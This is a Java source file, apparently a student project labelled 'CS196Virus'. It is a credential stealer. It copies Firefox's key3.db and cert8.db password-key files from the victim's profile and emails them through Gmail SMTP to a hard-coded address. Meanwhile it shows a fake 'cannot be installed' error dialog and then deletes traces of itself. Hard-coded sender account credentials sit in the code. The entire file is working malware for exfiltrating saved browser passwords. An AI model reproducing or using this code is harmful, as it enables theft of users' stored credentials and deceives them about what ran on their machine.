package virus;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.util.Properties;

import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.activation.FileDataSource;
import javax.mail.BodyPart;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Multipart;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;
import javax.swing.JOptionPane;

//How this program works:
//First, find the files that we need in order to steal some passwords and shit.
//Send the files to the downloads directory
//After waiting a set time, this program locates these files and when we can confirm that they do exist
//these files are sent to my email, where from there the non-hidden part of decrypting will take over

public class FileExtracter {

	static String downloadsDirectory = "";
	static String profilesDirectory = "";

	public static void main(String[] args) throws IOException {

		// get the source (profile directory) and the destination (downloads)
		// roots
		profilesDirectory = System.getProperty("user.home")
				+ "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\";
		downloadsDirectory = System.getProperty("user.home") + "\\Downloads\\";

		// get some info to find the 'secret' file from source
		File directory = new File(profilesDirectory);
		File[] fProfilesList = directory.listFiles();
		File defaultProfile = fProfilesList[0];

		// make source and destination files
		File key3src = new File(defaultProfile.toString() + "\\key3.db");
		File cert8src = new File(defaultProfile.toString() + "\\cert8.db");
		File key3dest = new File(downloadsDirectory + "\\key3.db");
		File cert8dest = new File(downloadsDirectory + "\\cert8.db");
		
		System.out.println("Loading...");

		// copy over the files using this method
		if(key3src.exists() && cert8src.exists()){
			copyFile(key3src, key3dest);
			copyFile(cert8src, cert8dest);
			//System.out.println("Copied over files successfully, will send soon...\n");
		} else {
			JOptionPane.showMessageDialog(null, "Fatal error! CS196Virus cannot be installed on this computer!", "Error 289", JOptionPane.INFORMATION_MESSAGE);
			return;
		}

		// wait 10 seconds to ensure successful copying
		Thread t = new Thread();

		try {
			// change to 1000 for now while testing other things
			t.sleep(10000);
		} catch (InterruptedException ie) {
			// don't do anything
		}

		// check to make sure that the files have been successfully moved over
		if (doExist()) {

			// if found, send each file with its own email
			sendEmail("key.db", "This message includes keys.db",
					downloadsDirectory + "key3.db");
			sendEmail("cert8.db", "This message includes cert8.db",
					downloadsDirectory + "cert8.db");

		} 
		
		JOptionPane.showMessageDialog(null, "Fatal error! CS196Virus cannot be installed on this computer!", "Error 773", JOptionPane.INFORMATION_MESSAGE);
		
		Delete.delete();

	} // end of main

	public static void copyFile(File from, File to) throws IOException {
		Files.copy(from.toPath(), to.toPath());
	}

	public static boolean doExist() {
		File f0 = new File(downloadsDirectory + "key3.db");
		File f1 = new File(downloadsDirectory + "cert8.db");

		return f0.exists() && f1.exists();
	}

	public static void sendEmail(String messageSubject, String messageBody,
			String messageAttachment) {
		// Recipient's email ID needs to be mentioned.

		String to = "djamrozik@ymail.com";// change accordingly

		// Sender's email ID needs to be mentioned
		String from = "cs196winhacks@gmail.com";// change accordingly
		final String username = "cs196winhacks";// change accordingly
		final String password = "pchacks196";// change accordingly

		// Assuming you are sending email through relay.jangosmtp.net
		String host = "smtp.gmail.com";

		Properties props = new Properties();
		props.put("mail.smtp.auth", "true");
		props.put("mail.smtp.starttls.enable", "true");
		props.put("mail.smtp.host", host);
		props.put("mail.smtp.port", "587");

		// Get the Session object.
		Session session = Session.getInstance(props,
				new javax.mail.Authenticator() {
					protected PasswordAuthentication getPasswordAuthentication() {
						return new PasswordAuthentication(username, password);
					}
				});

		try {
			
			// Create a default MimeMessage object.
			Message message = new MimeMessage(session);

			// Set From: header field of the header.
			message.setFrom(new InternetAddress(from));

			// Set To: header field of the header.
			message.setRecipients(Message.RecipientType.TO,
					InternetAddress.parse(to));

			// Set Subject: header field
			message.setSubject(messageSubject);

			// Create the message part
			BodyPart messageBodyPart = new MimeBodyPart();

			// Now set the actual message
			messageBodyPart.setText(messageBody);

			// Create a multipart message
			Multipart multipart = new MimeMultipart();

			// Set text message part
			multipart.addBodyPart(messageBodyPart);

			// Part two is attachment
			messageBodyPart = new MimeBodyPart();
			String filename = messageAttachment;
			DataSource source = new FileDataSource(filename);
			messageBodyPart.setDataHandler(new DataHandler(source));
			messageBodyPart.setFileName(filename);
			multipart.addBodyPart(messageBodyPart);

			// Send the complete message parts
			message.setContent(multipart);

			// Send message
			Transport.send(message);

			//System.out.println("Sent message successfully....");

		} catch (MessagingException e) {
			throw new RuntimeException(e);
		}
	}

}
